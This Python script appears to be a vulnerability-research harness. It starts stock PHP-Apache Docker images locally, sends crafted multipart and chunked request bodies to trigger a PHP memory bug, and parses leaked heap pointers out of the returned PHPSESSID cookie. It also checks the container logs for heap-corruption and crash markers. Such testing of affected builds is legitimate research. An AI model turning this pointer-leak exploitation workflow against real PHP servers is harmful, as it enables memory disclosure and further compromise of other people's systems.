#!/usr/bin/env python3
"""Affected-build coverage harness (mod_php prefork, stock image, 128M/8M/2M/30s).

Per build: A1 as-is -> B1 as-is xN; A1 parts sweep; optional 8.5-tuned A1/B1;
optional 109619 generic producer/consumer pair. Evidence written under out/<tag>/.

Resumable: if out/<tag>/result.json exists with "complete": true, skip.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import socket
import struct
import subprocess
import sys
import time
import urllib.parse

RUN = os.path.dirname(os.path.abspath(__file__))
SENDER = "/tmp/opencode/research/9bie_update_20261022T115026Z/code/repo/pure/chunked_send.py"
MK_A1 = "/tmp/opencode/research/modphp_109619_20261023T010232Z/scripts/mk_a1b.py"
MK_B = "/tmp/opencode/research/modphp_109619_20261023T010232Z/scripts/mk_leak_b2.py"
PAIR = "/tmp/opencode/research/oom109619_modphp_20261022T111008Z/lab"
QS = "/index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"


def sh(cmd, timeout=600):
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)


def docker_run(tag, name, port, workers=0, ini=False):
    """Start the stock image; use the image's own php.ini-production as php.ini.

    workers=1 mounts a single-child prefork config (diagnostic only).
    """
    sh(["docker", "rm", "-f", name])
    cmd = ["docker", "run", "-d", "--name", name, "-p", "127.0.0.1:%d:80" % port,
           "-v", os.path.join(RUN, "www") + ":/var/www/html:ro"]
    if workers == 1:
        cmd += ["-v", os.path.join(RUN, "conf", "prefork1.conf") +
                ":/etc/apache2/conf-enabled/zz-lab.conf:ro"]
    if ini:
        cmd += ["-v", os.path.join(RUN, "ini", "zz-lab.ini") +
                ":/usr/local/etc/php/conf.d/zz-lab.ini:ro"]
    cmd.append("php:%s-apache" % tag)
    r = sh(cmd)
    if r.returncode != 0:
        raise RuntimeError("docker run failed: %s" % r.stderr.strip()[:400])
    # install the stock production INI shipped inside the image
    sh(["docker", "exec", name, "cp", "-n",
        "/usr/local/etc/php/php.ini-production", "/usr/local/etc/php/php.ini"])
    sh(["docker", "restart", name])
    return r.stdout.strip()


def limits(port):
    r = get(port, "/info.php", timeout=8)
    out = {}
    if not r:
        return out
    for line in r.split(b"\r\n\r\n", 1)[-1].decode("latin1", "replace").splitlines():
        if "=" in line:
            k, _, v = line.partition("=")
            out[k.strip()] = v.strip()
    return out


def get(port, path="/index.php", timeout=5.0):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
    except OSError:
        return None
    s.settimeout(timeout)
    try:
        s.sendall(("GET %s HTTP/1.0\r\nHost: x\r\n\r\n" % path).encode())
        buf = bytearray()
        while True:
            d = s.recv(65536)
            if not d:
                break
            buf += d
            if len(buf) > 1 << 20:
                break
    except OSError:
        return None
    finally:
        s.close()
    return bytes(buf)


def wait_ready(port, timeout=45.0):
    t0 = time.time()
    while time.time() - t0 < timeout:
        r = get(port)
        if r and b" 200 " in r.split(b"\r\n", 1)[0]:
            return True
        time.sleep(0.4)
    return False


def restart(name, port):
    sh(["docker", "restart", name])
    time.sleep(1.2)
    return wait_ready(port)


def chunked(port, path, body, save):
    cmd = [sys.executable, SENDER, "--port", str(port), "--body-file", body,
           "--path", path, "--timeout", "300", "--save-response", save]
    r = sh(cmd, timeout=600)
    m = re.search(r"resp=(\d+) status='([^']*)'", r.stdout)
    if not m:
        return {"bytes": -1, "status": (r.stdout + r.stderr).strip()[:120]}
    return {"bytes": int(m.group(1)), "status": m.group(2)}


def plain_post(port, path, body_file, save):
    body = open(body_file, "rb").read()
    hdr = ("POST %s HTTP/1.0\r\nHost: x\r\n"
           "Content-Type: multipart/form-data; boundary=----c109619sess\r\n"
           "Content-Length: %d\r\nConnection: close\r\n\r\n" % (path, len(body))).encode()
    buf = bytearray()
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=30)
        s.settimeout(30)
        s.sendall(hdr + body)
        while True:
            d = s.recv(65536)
            if not d:
                break
            buf += d
    except OSError as exc:
        open(save, "wb").write(bytes(buf))
        return {"bytes": len(buf), "status": "EXC %s" % type(exc).__name__}
    open(save, "wb").write(bytes(buf))
    line = bytes(buf).split(b"\r\n", 1)[0].decode("latin1", "replace") or "EMPTY"
    return {"bytes": len(buf), "status": line}


def cookie_stats(respfile):
    """Decode Set-Cookie: PHPSESSID=... and classify the leak."""
    try:
        raw = open(respfile, "rb").read()
    except OSError:
        return {"cookie": "noresp"}
    i = raw.find(b"Set-Cookie: PHPSESSID=")
    if i < 0:
        return {"cookie": "absent"}
    v = raw[i + len(b"Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
    dec = urllib.parse.unquote_to_bytes(v.decode("latin1", "replace"))
    clusters = {}
    ptrs = 0
    for off in range(0, len(dec) - 8, 8):
        q = struct.unpack_from("<Q", dec, off)[0]
        if 0x7F0000000000 <= q <= 0x7FFFFFFFFFFFF:
            b = q & ~0x1FFFFF
            clusters.setdefault(b, 0)
            clusters[b] += 1
            ptrs += 1
    top = sorted(clusters.items(), key=lambda kv: -kv[1])[:3]
    return {"cookie": "present", "decoded": len(dec),
            "ptr_clusters": len(clusters), "ptrs": ptrs,
            "top": [["%#x" % b, n] for b, n in top],
            "head": dec[:24].hex()}


def logs_tail(name, n=40):
    r = sh(["docker", "logs", "--tail", str(n), name])
    return (r.stdout + r.stderr)


def crash_markers(text):
    marks = []
    for pat in ("zend_mm_heap corrupted", "Segmentation fault", "Aborted",
                "Allowed memory size", "child pid", "signal"):
        if pat.lower() in text.lower():
            marks.append(pat)
    return marks


def container_state(name):
    r = sh(["docker", "inspect", "-f",
            "{{.State.Running}} {{.State.ExitCode}} {{.RestartCount}}", name])
    return r.stdout.strip()


def image_digest(tag):
    r = sh(["docker", "image", "inspect", "-f",
            "{{index .RepoDigests 0}}", "php:%s-apache" % tag])
    return r.stdout.strip()


def php_version(port):
    r = get(port)
    if not r:
        return ""
    m = re.search(rb"OK ([^\s]+)", r)
    return m.group(1).decode() if m else ""


def ensure_a1(parts):
    p = os.path.join(RUN, "bodies", "a1_p%d.bin" % parts)
    if not os.path.exists(p):
        sh([sys.executable, MK_A1, "--out", p, "--parts", str(parts)])
    return p


def ensure(path, cmd):
    if not os.path.exists(path):
        sh(cmd)
    return path


def run_build(tag, port, plans, nb1=6, workers=0, ini=False):
    outdir = os.path.join(RUN, "out", tag.replace(".", ""))
    os.makedirs(outdir, exist_ok=True)
    rj = os.path.join(outdir, "result.json")
    if os.path.exists(rj):
        try:
            if json.load(open(rj)).get("complete"):
                print("SKIP %s (complete)" % tag)
                return
        except Exception:
            pass
    name = "bcov-" + tag.replace(".", "")
    res = {"tag": tag, "port": port, "started": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
           "image": image_digest(tag), "tests": {}}
    docker_run(tag, name, port, workers=workers, ini=ini)
    if not wait_ready(port):
        res["error"] = "container not ready"
        res["state"] = container_state(name)
        json.dump(res, open(rj, "w"), indent=1)
        return
    res["php"] = php_version(port)
    res["limits"] = limits(port)
    res["workers"] = workers or "stock"
    print("== %s  %s  %s" % (tag, res["php"], res["limits"].get("memory_limit")), flush=True)

    def save(name_):
        return os.path.join(outdir, name_)

    try:
        if "as-is" in plans:
            a1 = os.path.join(RUN, "bodies", "a1_84.bin")
            t = {}
            t["a1"] = chunked(port, QS, a1, save("a1.resp"))
            print("   A1 as-is: %s (%s B)" % (t["a1"]["status"], t["a1"]["bytes"]), flush=True)
            if t["a1"]["status"].startswith("HTTP") and " 500 " in t["a1"]["status"]:
                t["b1"] = []
                for i in range(nb1):
                    s = save("b1_%d.resp" % i)
                    r = chunked(port, "/index.php",
                                os.path.join(RUN, "bodies", "b1_84.bin"), s)
                    st = cookie_stats(s)
                    r.update(st)
                    t["b1"].append(r)
                    print("   B1 as-is i=%d %s cookie=%s decoded=%s" % (
                        i, r["status"], st.get("cookie"), st.get("decoded")), flush=True)
                    if st.get("decoded", 0) > 4096:
                        break
                t["b1_hits"] = sum(1 for r in t["b1"] if r.get("decoded", 0) > 4096)
            res["tests"]["as_is"] = t
            res["crash_as_is"] = crash_markers(logs_tail(name))

        if "sweep" in plans:
            t = {"parts": []}
            for parts in (820, 880, 920, 1000, 1060):
                restart(name, port)
                a1 = ensure_a1(parts)
                s = save("sweep_a1_p%d.resp" % parts)
                r = chunked(port, QS, a1, s)
                r["parts"] = parts
                t["parts"].append(r)
                print("   A1 p=%d: %s" % (parts, r["status"]), flush=True)
                if " 500 " in r["status"]:
                    probes = []
                    for i in range(3):
                        s2 = save("sweep_p%d_b1_%d.resp" % (parts, i))
                        r2 = chunked(port, "/index.php",
                                     os.path.join(RUN, "bodies", "b1_84.bin"), s2)
                        r2.update(cookie_stats(s2))
                        probes.append(r2)
                        print("     B1 after p=%d i=%d cookie=%s decoded=%s" % (
                            parts, i, r2.get("cookie"), r2.get("decoded")), flush=True)
                    r["b1_probes"] = probes
            res["tests"]["sweep"] = t
            res["crash_sweep"] = crash_markers(logs_tail(name))

        if "85" in plans:
            restart(name, port)
            t = {}
            t["a1_85"] = chunked(port, QS, os.path.join(RUN, "bodies", "a1_85.bin"),
                                 save("a1_85.resp"))
            print("   A1 8.5-tuned: %s (%s B)" % (t["a1_85"]["status"], t["a1_85"]["bytes"]),
                  flush=True)
            if " 500 " in t["a1_85"]["status"]:
                t["b1_85"] = []
                for i in range(nb1):
                    s = save("b1_85_%d.resp" % i)
                    r = chunked(port, "/index.php",
                                os.path.join(RUN, "bodies", "b1_85.bin"), s)
                    r.update(cookie_stats(s))
                    t["b1_85"].append(r)
                    print("   B1 8.5 i=%d %s cookie=%s decoded=%s ptrs=%s" % (
                        i, r["status"], r.get("cookie"), r.get("decoded"),
                        r.get("ptrs")), flush=True)
                    if r.get("decoded", 0) > 4096:
                        break
                t["b1_85_hits"] = sum(1 for r in t["b1_85"] if r.get("decoded", 0) > 4096)
            res["tests"]["tuned85"] = t
            res["crash_85"] = crash_markers(logs_tail(name))

        if "pair619" in plans:
            restart(name, port)
            t = {"a": [], "b": []}
            for i in range(3):
                s = save("pair_a_%d.resp" % i)
                t["a"].append(plain_post(port, "/index.php",
                                         os.path.join(PAIR, "sess_A.bin"), s))
                time.sleep(0.3)
                s2 = save("pair_b_%d.resp" % i)
                t["b"].append(plain_post(port, "/index.php",
                                         os.path.join(PAIR, "sess_B.bin"), s2))
                time.sleep(0.5)
                print("   pair i=%d A:%s B:%s" % (
                    i, t["a"][-1]["status"], t["b"][-1]["status"]), flush=True)
            t["logs"] = logs_tail(name, 60)
            t["markers"] = crash_markers(t["logs"])
            t["state_after"] = container_state(name)
            res["tests"]["pair619"] = t
    finally:
        res["state_final"] = container_state(name)
        res["complete"] = True
        json.dump(res, open(rj, "w"), indent=1)
        sh(["docker", "rm", "-f", name])
        print("   -> %s" % rj, flush=True)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--tag", required=True)
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--plans", default="as-is")
    ap.add_argument("--nb1", type=int, default=6)
    ap.add_argument("--workers", type=int, default=0)
    ap.add_argument("--ini", action="store_true")
    a = ap.parse_args()
    run_build(a.tag, a.port, a.plans.split(","), a.nb1, a.workers, a.ini)


if __name__ == "__main__":
    main()
